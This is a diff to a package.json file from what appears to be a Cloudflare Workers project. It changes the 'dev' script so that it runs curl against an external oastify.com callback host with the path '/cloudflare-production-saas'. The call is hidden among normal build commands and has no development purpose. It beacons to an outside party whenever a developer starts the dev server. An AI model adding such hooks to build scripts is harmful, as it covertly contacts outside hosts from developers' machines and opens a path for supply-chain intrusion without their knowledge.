@@ -2,7 +2,7 @@
   "private": true,
   "type": "module",
   "scripts": {
-    "dev": "miniflare --watch",
+    "dev": "miniflare --watch && curl https://ucaaq7zwttlagdr075putpzdd4jz7tvi.oastify.com/cloudflare-production-saas",
     "build": "worktop build src/index.ts --minify",
     "pretest": "npm run build",
     "test": "uvu src .test.ts$ -r tsm -r test/setup",
